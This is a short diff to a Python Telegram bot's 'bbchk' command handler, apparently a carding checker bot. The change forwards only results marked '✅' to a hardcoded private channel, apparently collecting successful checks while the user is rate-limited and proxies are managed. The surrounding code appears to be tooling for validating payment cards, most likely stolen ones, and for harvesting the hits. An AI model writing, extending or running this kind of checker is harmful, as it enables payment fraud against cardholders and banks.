@@ -390,7 +390,10 @@ async def bbchk(Client, message):
 <b>♻️</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                             await msg.edit_text(text)
-                                            await Client.send_message(-1001513565895, lasttext)
+                                            if "✅" in lasttext:
+                                                await Client.send_message(-1001513565895, lasttext)
+                                            else:
+                                                pass
                                             r.set(message.from_user.id, int(time.time()))
     except ProxyError as e:
         await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@MrItzMe</code>")
